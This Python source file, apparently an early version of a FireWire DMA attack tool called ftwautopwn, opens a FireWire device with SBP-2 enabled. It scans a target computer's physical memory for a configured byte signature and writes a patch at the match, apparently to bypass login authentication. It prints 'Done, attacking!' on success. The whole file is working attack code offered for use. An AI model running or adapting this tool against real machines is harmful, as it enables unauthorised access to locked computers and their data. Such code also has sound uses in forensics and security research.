'''
Created on Jun 23, 2011

@author: carmaa
'''
from binascii import unhexlify, hexlify
from forensic1394 import Bus
from ftwautopwn.util import print_msg, Context
from time import sleep
import sys
import math
import collections

ctx = Context()

class Method(object):
    '''
    classdocs
    '''


    def __init__(self, number, desc, patches):
        '''
        Constructor
        '''
        self.number = number
        self.desc = desc
        self.patches = patches
        

class Patch:
    '''
    classdocs
    '''


    def __init__(self, sig, patch, offset):
        '''
        Constructor
        '''
        self.sig = sig
        self.patch = patch
        self.offset = offset

class MemoryFile:
    '''
    classdocs
    '''

    def __init__(self, file_name, pagesize):
        '''
        Constructor
        '''
        self.file = open(file_name, mode='rb')
        self.pagesize = pagesize
    
    def read(self, addr, numb, buf=None):
        self.file.seek(addr)
        return self.file.read(numb)  
    
    def readv(self, req):
        for r in req:
            self.file.seek(r[0])
            yield (r[0], self.file.read(r[1]))
    
    def write(self, addr, buf):
        '''
        For now, dummy method in order to simulate a write
        '''
        pass
        

def run(context):
    global ctx
    ctx = context
    config = ctx.config
    enc = ctx.encoding
    
    # Select target unless already supplied by user
    if not ctx.target:
        list_targets(config)
        ctx.target = select_target(config, False)
    
    # Parse the command line arguments
    sigs = unhexlify(bytes(config.get(ctx.target, 'signature'), enc))
    patch = unhexlify(bytes(config.get(ctx.target, 'patch'), enc))
    off = int(config.get(ctx.target, 'pageoffset'))
    print_msg('+', 'You have selected: ' + ctx.target)
    print('    Using signature: ' + hexlify(sigs).decode(enc))
    print('    Using patch: ' + hexlify(patch).decode(enc))
    print('    Using offset: ' + str(off))
    
    d = None
    if ctx.file_mode:
        d = MemoryFile(ctx.file_name, ctx.PAGESIZE)
    else:
        d = initialize_fw(d)
    
    try:
        # Find
        addr = findsig(d, sigs, off)
        print()
        print_msg('+', 'Signature found at 0x%x.' % addr)
        # Patch and verify if not dry run
        if not ctx.dry_run: 
            d.write(addr, patch)
            if d.read(addr, len(patch)) == patch:
                print_msg('+', 'Write-back verified; patching successful. Bon voyage!')
            else:
                print_msg('-', 'Write-back could not be verified; patching unsuccessful.')
    except IOError:
        print('-', 'Signature not found.')


def list_targets(config):
    # Populate list with methods from config file
    methods = list()
    
    # Check that the config file contains targets
    if not config.sections():
        print_msg('!', 'No configurated targets in config file.')
        sys.exit(1)
    
    i = 1
    for method_name in config.sections():
        # Generate lists of corresponding sigs, patches and offsets
        sigs = config.get(method_name, 'signature').split(':')
        patches = config.get(method_name, 'patch').split(':')
        pageoffsets = config.get(method_name, 'pageoffset').split(':')

        if (len(sigs) != len(patches) or \
            len(patches) != len(pageoffsets)):
            print_msg('!', 'Uneven number of signatures, patches and page ' 
                      'offsets in section %s of configuration file.' 
                      % method_name)
            sys.exit(1)

        # Populate patches for the given method
        p = list()
        for j in range(len(sigs)):
            p.append(Patch(sigs[j], patches[j], pageoffsets[j]))
        
        # Add patches to the method
        methods.append(Method(i, method_name, patches))
        
        i += 1
    
    print_msg('+', 'Available targets:')
    i = 1
    for target in config.sections():
        print_msg(str(i), target)
        if ctx.verbose: print('\t' + config.get(target, 'notes'))
        i += 1


def select_target(config, selected):
    if not selected: selected = input('Please select target (or enter \'q\' to quit): ')
    nof_targets = len(config.sections())
    try:
        selected = int(selected)
    except:
        if selected == 'q': sys.exit()
        else:
            print_msg('!', 'Invalid selection, please try again. Type \'q\' ' \
                      'to quit.')
            return select_target(config)
    if selected <= nof_targets: return list(config)[selected]
    else:
        print_msg('!', 'Please enter a selection between 1 and ' + \
                  str(nof_targets) + '. Type \'q\' to quit.')
        return select_target(config)

def initialize_fw(d):
    b = Bus()
    # Enable SBP-2 support to ensure we get DMA
    b.enable_sbp2()
    for i in range(ctx.fw_delay, 0, -1):
        sys.stdout.write('[+] Initializing bus and enabling SBP2, please wait' \
                         ' %2d seconds\r' % i)
        sys.stdout.flush()
        sleep(1)
    # Open the first device
    d = b.devices()[0]
    d.open()
    print()
    print_msg('+', 'Done, attacking!\n')
    return d

def findsig(d, sig, off):
    # Skip the first 1 MiB of memory
    addr = 1 * 1024 * 1024 + off
    # An array to store the last read values of data so that we can assess if
    # we're sucking data through the wire or not
    buf = collections.deque(10*[0], 10)
    while True:
        # Prepare a batch of 128 requests
        r = [(addr + ctx.PAGESIZE * i, len(sig)) for i in range(0, 128)]
        for caddr, cand  in d.readv(r):
            if cand == sig: return caddr
        mibaddr = math.floor(addr / (1024 * 1024))
        sys.stdout.write('[+] Searching for signature, {0:>4d} MiB so far.'.format(mibaddr))
        if ctx.verbose:
            sys.stdout.write(' Data read: {1}'.format(hexlify(cand).decode(ctx.encoding)))
        
        sys.stdout.write('\r')
        sys.stdout.flush()
        
        # Append read data to buffer, and check if the all entries in the buffer
        # is equal. If they are, we're likely not getting data
        buf.appendleft(cand)
        if all_equal(buf):
            print()
            cont = input('[-] Looks like we\'re not getting any data. We ' \
                         'could be outside memory\n    boundaries, or simply ' \
                         'not have DMA. Try using -v/--verbose to debug.\n    '\
                         'Continue? [Y/n]: ')
            if cont == 'n': sys.exit(1)
            else: # Double the buffer
                buf = collections.deque(buf.maxlen*2*[0], buf.maxlen*2)
        
        addr += ctx.PAGESIZE * 128

def all_equal(iterator):
    try:
        iterator = iter(iterator)
        first = next(iterator)
        return all(first == rest for rest in iterator)
    except StopIteration:
        return True